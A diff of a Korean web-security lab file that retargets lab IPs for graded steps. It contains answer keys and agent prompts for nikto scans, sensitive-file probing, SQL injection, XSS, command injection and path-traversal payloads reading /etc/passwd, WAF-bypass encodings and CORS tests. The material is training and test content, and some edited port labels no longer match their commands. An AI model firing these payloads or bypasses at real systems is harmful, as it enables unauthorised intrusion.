@@ -23,9 +23,9 @@ steps:
   hint: nikto -h http://{{WEB_IP}}:3000 -maxtime 30 형태로 실행하세요.
   category: recon
   points: 8
-  answer: '🤖 프롬프트: nikto를 사용하여 대상 웹 서버(10.20.30.80:3000)의 보안 설정을 스캔해줘
+  answer: '🤖 프롬프트: nikto를 사용하여 대상 웹 서버(10.20.40.81:3000)의 보안 설정을 스캔해줘
 
-    📎 참고 (CLI): nikto -h http://10.20.30.80:3000 -maxtime 30 2>/dev/null | head -30'
+    📎 참고 (CLI): nikto -h http://10.20.40.81:3000 -maxtime 30 2>/dev/null | head -30'
   answer_detail: nikto는 웹 서버의 알려진 취약점, 설정 오류, 기본 파일 등을 자동으로 스캔합니다. Server 헤더 정보 노출,
     디렉터리 리스팅, 기본 파일(phpinfo.php, .htaccess), HTTP 메서드 설정 등을 확인합니다.
   verify:
@@ -48,9 +48,9 @@ steps:
       - 취약점 목록 누락
       - 결과 해석 없음
   target_vm: attacker
-  script: nikto -h http://10.20.30.80:3000 -maxtime 30 2>/dev/null | head -30
+  script: nikto -h http://10.20.40.81:3000 -maxtime 30 2>/dev/null | head -30
   risk_level: low
-  bastion_prompt: 'nikto를 사용하여 대상 웹 서버(10.20.30.80:3000)의 보안 설정을 스캔해줘
+  bastion_prompt: 'nikto를 사용하여 대상 웹 서버(10.20.40.81:3000)의 보안 설정을 스캔해줘
 
 
 
@@ -72,10 +72,10 @@ steps:
   points: 8
   answer: '🤖 프롬프트: 각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인해줘
 
-    📎 참고 (CLI): echo ''=== Port 80 (Apache+ModSecurity) ==='' && curl -sI http://10.20.30.80:80
+    📎 참고 (CLI): echo ''=== Port 80 (Apache+ModSecurity) ==='' && curl -sI http://10.20.32.80:80
     | grep -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 3000 (JuiceShop)
-    ==='' && curl -sI http://10.20.30.80:3000 | grep -iE ''(server|x-powered|x-aspnet)''
-    && echo ''=== Port 8080 (DVWA) ==='' && curl -sI http://10.20.30.80:8080 | grep
+    ==='' && curl -sI http://10.20.40.81:3000 | grep -iE ''(server|x-powered|x-aspnet)''
+    && echo ''=== Port 8080 (DVWA) ==='' && curl -sI http://10.20.40.82:80 | grep
     -iE ''(server|x-powered|x-aspnet)'''
   answer_detail: Server 헤더에 소프트웨어 이름과 버전이 노출되면 공격자가 해당 버전의 알려진 CVE를 검색할 수 있습니다. Apache는
     ServerTokens Prod, Nginx는 server_tokens off로 최소 정보만 노출해야 합니다. X-Powered-By 헤더는
@@ -100,10 +100,10 @@ steps:
       - 헤더 수집 누락
       - CVE 맥락 없음
   target_vm: attacker
-  script: echo '=== Port 80 (Apache+ModSecurity) ===' && curl -sI http://10.20.30.80:80
+  script: echo '=== Port 80 (Apache+ModSecurity) ===' && curl -sI http://10.20.32.80:80
     | grep -iE '(server|x-powered|x-aspnet)' && echo '=== Port 3000 (JuiceShop) ==='
-    && curl -sI http://10.20.30.80:3000 | grep -iE '(server|x-powered|x-aspnet)' &&
-    echo '=== Port 8080 (DVWA) ===' && curl -sI http://10.20.30.80:8080 | grep -iE
+    && curl -sI http://10.20.40.81:3000 | grep -iE '(server|x-powered|x-aspnet)' &&
+    echo '=== Port 8080 (DVWA) ===' && curl -sI http://10.20.40.82:80 | grep -iE
     '(server|x-powered|x-aspnet)'
   risk_level: low
   bastion_prompt: '각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인해줘
@@ -130,9 +130,9 @@ steps:
     /encryptionkeys/ 등을 확인해줘
 
     📎 참고 (CLI): echo ''=== Directory Listing Check ==='' && for DIR in ftp assets
-    encryptionkeys public; do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.30.80:3000/$DIR/
+    encryptionkeys public; do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.40.81:3000/$DIR/
     | head -c 200) && if echo "$RESP" | grep -qi ''href\|listing\|index of''; then
-    echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$DIR/)";
+    echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.40.81:3000/$DIR/)";
     fi; done && echo ''=== Dir Listing Check Complete ==='''
   answer_detail: 디렉터리 리스팅이 활성화되면 백업 파일, 설정 파일, 소스코드 등이 노출됩니다. JuiceShop의 /ftp/ 디렉터리에는
     package.json.bak, 쿠폰 파일 등이 노출되어 있습니다. Apache는 Options -Indexes로 비활성화합니다.
@@ -158,9 +158,9 @@ steps:
       - 방어 언급 없음
   target_vm: attacker
   script: 'echo ''=== Directory Listing Check ==='' && for DIR in ftp assets encryptionkeys
-    public; do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.30.80:3000/$DIR/
+    public; do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.40.81:3000/$DIR/
     | head -c 200) && if echo "$RESP" | grep -qi ''href\|listing\|index of''; then
-    echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$DIR/)";
+    echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.40.81:3000/$DIR/)";
     fi; done && echo ''=== Dir Listing Check Complete ==='''
   risk_level: medium
   bastion_prompt: '디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/,
@@ -189,8 +189,8 @@ steps:
 
     📎 참고 (CLI): echo ''=== Sensitive File Scan ==='' && for FILE in .git/config .env
     .htaccess robots.txt package.json main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak
-    ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w ''%{size_download}'' http://10.20.30.80:3000/$FILE
-    2>/dev/null); CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$FILE
+    ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w ''%{size_download}'' http://10.20.40.81:3000/$FILE
+    2>/dev/null); CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.40.81:3000/$FILE
     2>/dev/null); echo "/$FILE: HTTP $CODE ($SIZE bytes)"; done && echo ''=== Sensitive
     File Scan Complete ==='''
   answer_detail: package.json은 의존성 정보(버전 포함)를 노출하여 알려진 취약점(CVE)을 매칭할 수 있습니다. .bak
@@ -218,8 +218,8 @@ steps:
   target_vm: attacker
   script: 'echo ''=== Sensitive File Scan ==='' && for FILE in .git/config .env .htaccess
     robots.txt package.json main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak
-    ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w ''%{size_download}'' http://10.20.30.80:3000/$FILE
-    2>/dev/null); CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$FILE
+    ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null -w ''%{size_download}'' http://10.20.40.81:3000/$FILE
+    2>/dev/null); CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.40.81:3000/$FILE
     2>/dev/null); echo "/$FILE: HTTP $CODE ($SIZE bytes)"; done && echo ''=== Sensitive
     File Scan Complete ==='''
   risk_level: medium
@@ -246,9 +246,9 @@ steps:
   answer: '🤖 프롬프트: 에러 메시지를 통한 정보 노출을 확인해줘
 
     📎 참고 (CLI): echo ''=== Error Information Leak ==='' && echo ''[SQL Error]'' &&
-    curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27'' | head -c 300
-    && echo '''' && echo ''[Invalid API]'' && curl -s http://10.20.30.80:3000/api/Nonexistent/
-    | head -c 200 && echo '''' && echo ''[Type Error]'' && curl -s ''http://10.20.30.80:3000/api/Products/abc''
+    curl -s ''http://10.20.40.81:3000/rest/products/search?q=test%27'' | head -c 300
+    && echo '''' && echo ''[Invalid API]'' && curl -s http://10.20.40.81:3000/api/Nonexistent/
+    | head -c 200 && echo '''' && echo ''[Type Error]'' && curl -s ''http://10.20.40.81:3000/api/Products/abc''
     | head -c 200 && echo '''' && echo ''=== Error Leak Check Complete ==='''
   answer_detail: 상세한 에러 메시지는 데이터베이스 종류(SQLite, MySQL), 테이블 구조, 파일 시스템 경로, 프레임워크 버전
     등을 노출합니다. 프로덕션에서는 일반적인 에러 페이지만 표시하고 상세 로그는 서버 내부에만 기록해야 합니다.
@@ -272,9 +272,9 @@ steps:
       - 응답 분석 없음
       - 방어 권고 누락
   target_vm: attacker
-  script: echo '=== Error Information Leak ===' && echo '[SQL Error]' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27'
-    | head -c 300 && echo '' && echo '[Invalid API]' && curl -s http://10.20.30.80:3000/api/Nonexistent/
-    | head -c 200 && echo '' && echo '[Type Error]' && curl -s 'http://10.20.30.80:3000/api/Products/abc'
+  script: echo '=== Error Information Leak ===' && echo '[SQL Error]' && curl -s 'http://10.20.40.81:3000/rest/products/search?q=test%27'
+    | head -c 300 && echo '' && echo '[Invalid API]' && curl -s http://10.20.40.81:3000/api/Nonexistent/
+    | head -c 200 && echo '' && echo '[Type Error]' && curl -s 'http://10.20.40.81:3000/api/Products/abc'
     | head -c 200 && echo '' && echo '=== Error Leak Check Complete ==='
   risk_level: medium
   bastion_prompt: '에러 메시지를 통한 정보 노출을 확인해줘
@@ -300,12 +300,12 @@ steps:
   answer: '🤖 프롬프트: ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인해줘
 
     📎 참고 (CLI): echo ''=== WAF Detection Test ==='' && echo -n ''[XSS] '' && curl
-    -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E''
+    -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.32.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E''
     && echo '''' && echo -n ''[SQLi] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    "http://10.20.30.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[CMDi] '' &&
-    curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?cmd=;cat+/etc/passwd''
+    "http://10.20.32.80:80/?id=1''+OR+1=1--" && echo '''' && echo -n ''[CMDi] '' &&
+    curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.32.80:80/?cmd=;cat+/etc/passwd''
     && echo '''' && echo -n ''[LFI] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    ''http://10.20.30.80:80/../../etc/passwd'' && echo '''' && echo ''=== WAF Detection
+    ''http://10.20.32.80:80/../../etc/passwd'' && echo '''' && echo ''=== WAF Detection
     Complete ==='''
   answer_detail: ModSecurity는 OWASP Core Rule Set(CRS)을 사용하여 공격 패턴을 탐지합니다. 403이 반환되면
     WAF가 차단한 것입니다. 모든 공격 유형에 대해 403이 나와야 정상입니다. 200이 나오면 해당 공격 유형의 룰이 미적용된 것입니다.
@@ -330,12 +330,12 @@ steps:
       - CRS 룰 언급 없음
   target_vm: attacker
   script: echo '=== WAF Detection Test ===' && echo -n '[XSS] ' && curl -s -o /dev/null
-    -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
+    -w 'HTTP:%{http_code}' 'http://10.20.32.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
     && echo '' && echo -n '[SQLi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
-    "http://10.20.30.80:80/?id=1'+OR+1=1--" && echo '' && echo -n '[CMDi] ' && curl
-    -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;cat+/etc/passwd'
+    "http://10.20.32.80:80/?id=1'+OR+1=1--" && echo '' && echo -n '[CMDi] ' && curl
+    -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.32.80:80/?cmd=;cat+/etc/passwd'
     && echo '' && echo -n '[LFI] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
-    'http://10.20.30.80:80/../../etc/passwd' && echo '' && echo '=== WAF Detection
+    'http://10.20.32.80:80/../../etc/passwd' && echo '' && echo '=== WAF Detection
     Complete ==='
   risk_level: medium
   bastion_prompt: 'ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인해줘
@@ -363,14 +363,14 @@ steps:
     차단을 우회해줘
 
     📎 참고 (CLI): echo ''=== WAF Bypass Techniques ==='' && echo -n ''[Normal XSS -
-    blocked] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E''
+    blocked] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.32.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E''
     && echo '''' && echo -n ''[Double Encoded] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    ''http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E'' && echo
+    ''http://10.20.32.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E'' && echo
     '''' && echo -n ''[Mixed Case] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    ''http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'' && echo '''' &&
-    echo -n ''[SQL Comment] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3''
+    ''http://10.20.32.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'' && echo '''' &&
+    echo -n ''[SQL Comment] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.32.80:80/?id=1+UNION/**/SELECT/**/1,2,3''
     && echo '''' && echo -n ''[HPP] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}''
-    ''http://10.20.30.80:80/?id=1&id=OR+1%3D1--'' && echo '''' && echo ''=== Bypass
+    ''http://10.20.32.80:80/?id=1&id=OR+1%3D1--'' && echo '''' && echo ''=== Bypass
     Test Complete ==='''
   answer_detail: 이중 인코딩은 WAF가 한 번 디코딩 후 패턴 매칭하지만, 백엔드가 다시 디코딩하여 공격이 성공하는 기법입니다. OWASP
     CRS 3.x는 재귀적 디코딩과 대소문자 무시 매칭으로 대부분 방어합니다. WAF는 만능이 아니므로 서버 측 입력 검증을 병행해야 합니다.
@@ -395,13 +395,13 @@ steps:
       - signature 기반 한계 언급 없음
   target_vm: attacker
   script: echo '=== WAF Bypass Techniques ===' && echo -n '[Normal XSS - blocked]
-    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
+    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.32.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E'
     && echo '' && echo -n '[Double Encoded] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
-    'http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E' && echo ''
-    && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'
+    'http://10.20.32.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E' && echo ''
+    && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.32.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'
     && echo '' && echo -n '[SQL Comment] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
-    'http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3' && echo '' && echo -n '[HPP]
-    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1&id=OR+1%3D1--'
+    'http://10.20.32.80:80/?id=1+UNION/**/SELECT/**/1,2,3' && echo '' && echo -n '[HPP]
+    ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.32.80:80/?id=1&id=OR+1%3D1--'
     && echo '' && echo '=== Bypass Test Complete ==='
   risk_level: medium
   bastion_prompt: 'WAF 우회를 위한 인코딩 기법을 테스트하시오. URL 이중 인코딩, 대소문자 혼합, SQL 주석 삽입으로 XSS/SQLi
@@ -431,9 +431,9 @@ steps:
 
     📎 참고 (CLI): PAYLOAD="id=1''+OR+1=1--" && echo ''=== HTTP Method Bypass ==='' &&
     for METHOD in GET POST PUT PATCH; do echo -n "[$METHOD] " && curl -s -o /dev/null
-    -w ''HTTP:%{http_code}'' -X $METHOD -d "$PAYLOAD" http://10.20.30.80:80/ && echo
+    -w ''HTTP:%{http_code}'' -X $METHOD -d "$PAYLOAD" http://10.20.32.80:80/ && echo
     ''''; done && echo ''=== Content-Type Bypass ==='' && echo -n ''[JSON] '' && curl
-    -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type:
+    -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.32.80:80/ -H ''Content-Type:
     application/json'' -d ''{"id":"1 OR 1=1--"}'' && echo '''' && echo ''=== Method
     Bypass Test Complete ==='''
   answer_detail: 일부 WAF 규칙은 특정 HTTP 메서드(GET/POST)에만 적용됩니다. PUT이나 PATCH로 같은 페이로드를 보내면
@@ -461,9 +461,9 @@ steps:
   target_vm: attacker
   script: 'PAYLOAD="id=1''+OR+1=1--" && echo ''=== HTTP Method Bypass ==='' && for
     METHOD in GET POST PUT PATCH; do echo -n "[$METHOD] " && curl -s -o /dev/null
-    -w ''HTTP:%{http_code}'' -X $METHOD -d "$PAYLOAD" http://10.20.30.80:80/ && echo
+    -w ''HTTP:%{http_code}'' -X $METHOD -d "$PAYLOAD" http://10.20.32.80:80/ && echo
     ''''; done && echo ''=== Content-Type Bypass ==='' && echo -n ''[JSON] '' && curl
-    -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type:
+    -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.32.80:80/ -H ''Content-Type:
     application/json'' -d ''{"id":"1 OR 1=1--"}'' && echo '''' && echo ''=== Method
     Bypass Test Complete ==='''
   risk_level: medium
@@ -492,10 +492,10 @@ steps:
     테스트해줘
 
     📎 참고 (CLI): echo ''=== CORS Misconfiguration Test ==='' && echo ''[JuiceShop -
-    evil.com]'' && curl -sI http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com''
-    | grep -i access-control && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.30.80:3000/api/Products/
+    evil.com]'' && curl -sI http://10.20.40.81:3000/api/Products/ -H ''Origin: http://evil.com''
+    | grep -i access-control && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.40.81:3000/api/Products/
     -H ''Origin: null'' | grep -i access-control && echo ''[DVWA - evil.com]'' &&
-    curl -sI http://10.20.30.80:8080/ -H ''Origin: http://evil.com'' | grep -i access-control
+    curl -sI http://10.20.40.82:80/ -H ''Origin: http://evil.com'' | grep -i access-control
     || echo ''No CORS headers'' && echo ''=== CORS Test Complete ==='''
   answer_detail: Access-Control-Allow-Origin이 요청의 Origin을 그대로 반영하거나 *이면, 모든 도메인에서
     API를 호출할 수 있습니다. 공격자의 악성 사이트에서 JavaScript로 API를 호출하여 인증된 사용자의 데이터를 탈취할 수 있습니다.
@@ -521,10 +521,10 @@ steps:
       - credentials 조합 위험 누락
   target_vm: attacker
   script: 'echo ''=== CORS Misconfiguration Test ==='' && echo ''[JuiceShop - evil.com]''
-    && curl -sI http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com''
-    | grep -i access-control && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.30.80:3000/api/Products/
+    && curl -sI http://10.20.40.81:3000/api/Products/ -H ''Origin: http://evil.com''
+    | grep -i access-control && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.40.81:3000/api/Products/
     -H ''Origin: null'' | grep -i access-control && echo ''[DVWA - evil.com]'' &&
-    curl -sI http://10.20.30.80:8080/ -H ''Origin: http://evil.com'' | grep -i access-control
+    curl -sI http://10.20.40.82:80/ -H ''Origin: http://evil.com'' | grep -i access-control
     || echo ''No CORS headers'' && echo ''=== CORS Test Complete ==='''
   risk_level: medium
   bastion_prompt: 'CORS 설정 오류를 확인하시오. Origin 헤더를 evil.com으로 설정하여 크로스 도메인 접근이 허용되는지
@@ -548,7 +548,7 @@ steps:
   category: reporting
   points: 10
   answer: "\U0001F916 프롬프트: 보안 설정 오류 종합 점검 결과를 정리해줘\n\U0001F4CE 참고 (CLI): cat > /tmp/misconfig_report.txt\
-    \ << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n대상: 10.20.30.80 (Apache:80, JuiceShop:3000,\
+    \ << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n대상: 10.20.32.80 (Apache:80, JuiceShop:3000,\
     \ DVWA:8080)\n\n[즉시 조치 - CRITICAL]\n1. 디렉터리 리스팅 비활성화\n   Apache: Options -Indexes\n\
     \   Express: 정적 파일 서빙 경로 제한\n2. 민감 파일(.bak, .git, .env) 접근 차단\n   Apache: <FilesMatch>\
     \ deny 규칙\n3. 에러 메시지 최소화\n   NODE_ENV=production 설정\n\n[단기 조치 - HIGH]\n4. Server\
@@ -584,7 +584,7 @@ steps:
       - 파일 저장 없음
   target_vm: attacker
   script: "cat > /tmp/misconfig_report.txt << 'EOF'\n=== 보안 설정 오류 종합 점검 보고서 ===\n\
-    대상: 10.20.30.80 (Apache:80, JuiceShop:3000, DVWA:8080)\n\n[즉시 조치 - CRITICAL]\n\
+    대상: 10.20.32.80 (Apache:80, JuiceShop:3000, DVWA:8080)\n\n[즉시 조치 - CRITICAL]\n\
     1. 디렉터리 리스팅 비활성화\n   Apache: Options -Indexes\n   Express: 정적 파일 서빙 경로 제한\n2.\
     \ 민감 파일(.bak, .git, .env) 접근 차단\n   Apache: <FilesMatch> deny 규칙\n3. 에러 메시지 최소화\n\
     \   NODE_ENV=production 설정\n\n[단기 조치 - HIGH]\n4. Server 헤더 최소화: ServerTokens Prod\n\
@@ -607,15 +607,15 @@ steps:
     \ #1·#2·#3·#4 CVSS+PoC+보고서+우선순위) + (lab #3·#4·#7·#8 디렉터리·파일·인코딩·메서드 우회) 통합.\n\n\
     ■ 임무 (3 단계, 약 35분)\n\n### Phase A — 설정 오류 + 민감 파일 노출 점검 (lab #2·#3·#4)\n1) `for\
     \ p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/' '/.env' '/backup.sql'; do\n\
-    \     echo -n \"$p: \"; curl -s -o /dev/null -w \"%{http_code}\\n\" \"http://10.20.30.80$p\"\
-    ; done`\n2) Server 헤더: `curl -s -I http://10.20.30.80/ | grep -E \"Server|X-Powered\"\
-    `\n3) 에러 노출: `curl -s \"http://10.20.30.80/api/Users/abc'%22%3E\" | head -c 300`\n\
+    \     echo -n \"$p: \"; curl -s -o /dev/null -w \"%{http_code}\\n\" \"http://10.20.32.80$p\"\
+    ; done`\n2) Server 헤더: `curl -s -I http://10.20.32.80/ | grep -E \"Server|X-Powered\"\
+    `\n3) 에러 노출: `curl -s \"http://10.20.32.80/api/Users/abc'%22%3E\" | head -c 300`\n\
     \n### Phase B — WAF 우회 3 기법 (lab #7·#8)\n동일 SQLi payload 를 3 가지로 변형해 WAF 차단 비교\
     \ — JuiceShop 직접:3000 vs nginx WAF:80 (가정).\n1) URL 이중 인코딩: `curl -s -o /dev/null\
-    \ -w \"double-enc: %{http_code}\\n\"\n   \"http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--\"\
-    `\n2) 대소문자 혼합: `curl -s -o /dev/null -w \"case-mix: %{http_code}\\n\"\n   \"http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--\"\
+    \ -w \"double-enc: %{http_code}\\n\"\n   \"http://10.20.32.80/rest/products/search?q=%2527%2520OR%25201%253D1--\"\
+    `\n2) 대소문자 혼합: `curl -s -o /dev/null -w \"case-mix: %{http_code}\\n\"\n   \"http://10.20.32.80/rest/products/search?q=%27%20Or%201%3D1--\"\
     `\n3) HTTP 메서드 변조 + Content-Type: `curl -s -o /dev/null -w \"method-PUT: %{http_code}\\\
-    n\"\n   -X PUT -H \"Content-Type: application/xml\" -d \"<x>data</x>\" \"http://10.20.30.80/rest/user/login\"\
+    n\"\n   -X PUT -H \"Content-Type: application/xml\" -d \"<x>data</x>\" \"http://10.20.32.80/rest/user/login\"\
     `\n\n### Phase C — CVSS v3.1 + 우선순위 보고서\n| 발견 | CVSS Vector | Score | 구현 난이도 |\
     \ 우선순위 (Quick Win 순) |\n| /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5\
     \ (High) | 낮음 (config 1줄) | #1 Quick Win |\n| Server header 누설 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N\
@@ -631,13 +631,13 @@ steps:
   bastion_prompt: "[복합 시나리오 — w14 CVSS + 우선순위 보고서]\n\nJuiceShop 설정 오류 + WAF 우회 + CVSS\
     \ 보고서 3 phase.\n\nPhase A:\n`for p in '/ftp/' '/assets/' '/encryptionkeys/' '/.git/'\
     \ '/.env' '/backup.sql'; do\n   echo -n \"$p: \"; curl -s -o /dev/null -w \"%{http_code}\\\
-    n\" \"http://10.20.30.80$p\"; done`\n`curl -s -I http://10.20.30.80/ | grep -E\
-    \ \"Server|X-Powered\"`\n`curl -s \"http://10.20.30.80/api/Users/abc%27%22\" |\
+    n\" \"http://10.20.32.80$p\"; done`\n`curl -s -I http://10.20.32.80/ | grep -E\
+    \ \"Server|X-Powered\"`\n`curl -s \"http://10.20.32.80/api/Users/abc%27%22\" |\
     \ head -c 300`\n\nPhase B (WAF 우회 3):\n`curl -s -o /dev/null -w \"double-enc:\
-    \ %{http_code}\\n\" \"http://10.20.30.80/rest/products/search?q=%2527%2520OR%25201%253D1--\"\
-    `\n`curl -s -o /dev/null -w \"case-mix: %{http_code}\\n\" \"http://10.20.30.80/rest/products/search?q=%27%20Or%201%3D1--\"\
+    \ %{http_code}\\n\" \"http://10.20.32.80/rest/products/search?q=%2527%2520OR%25201%253D1--\"\
+    `\n`curl -s -o /dev/null -w \"case-mix: %{http_code}\\n\" \"http://10.20.32.80/rest/products/search?q=%27%20Or%201%3D1--\"\
     `\n`curl -s -o /dev/null -w \"method-PUT: %{http_code}\\n\" -X PUT -H \"Content-Type:\
-    \ application/xml\" -d \"<x>data</x>\" \"http://10.20.30.80/rest/user/login\"\
+    \ application/xml\" -d \"<x>data</x>\" \"http://10.20.32.80/rest/user/login\"\
     `\n\nPhase C (CVSS + 우선순위):\n```\n| 발견 | CVSS Vector | Score | 구현 난이도 | 우선순위 |\n\
     | /.git 노출 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 High | 낮음 | #1 Quick Win\
     \ |\n| Server header | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | 5.3 Medium | 낮음 |\
